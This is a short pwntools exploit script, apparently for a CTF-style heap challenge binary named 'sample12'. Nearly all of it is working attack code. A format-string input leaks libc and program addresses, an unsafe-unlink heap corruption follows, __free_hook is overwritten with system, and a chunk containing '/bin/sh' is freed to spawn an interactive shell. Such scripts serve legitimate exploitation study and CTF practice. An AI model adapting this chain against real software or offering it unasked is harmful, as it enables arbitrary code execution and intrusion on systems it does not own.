from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample12')
elf = ELF('./data/sample12')
libc = elf.libc

def add(idx, size, content):
    p.sendlineafter(b'>> ', b'1')
    p.recvuntil(b'(0-10):')
    p.sendline(str(idx))
    p.recvuntil(b'Enter a size:\n')
    p.sendline(str(size))
    p.recvuntil(b'Enter the content: \n')
    p.sendline(content)

def edit(idx, content):
    p.sendlineafter(b'>> ', b'4')
    p.recvuntil(b'Enter an index:\n')
    p.sendline(str(idx))
    p.recvuntil(b'Enter the content: \n')
    p.sendline(content)

def delete(idx):
    p.sendlineafter(b'>> ', b'2')
    p.recvuntil(b'Enter an index:\n')
    p.sendline(str(idx).encode())

p.recvuntil(b'Enter your name: ');p.sendline(b'%15$p%19$p');p.recvuntil(b'Hello, ');leak = int(p.recv(14), 16) - 240;base = leak - libc.symbols["__libc_start_main"];libc.address = base;sys = libc.symbols["system"];free_hook = libc.symbols["__free_hook"]#step.1
leak1 = int(p.recv(15), 16);ptr = leak1 - 0x116a + 0x202060#step.2
add(0, 0x98, 'a'*8);add(1, 0x90, 'b'*8)#step.3
payload = p64(0) + p64(0x91) + p64(ptr - 0x18) + p64(ptr - 0x10) + p64(0)*14 + p64(0x90) + b"\xa0";edit(0, payload)#step.4
delete(1)#step.5
payload = p64(0)*3 + p64(free_hook) + p64(0x48) + p64(ptr + 0x18) + b'/bin/sh\x00';edit(0, payload)#step.6
payload = p64(sys);edit(0, payload)#step.7
delete(1)#step.8
p.interactive()#step.9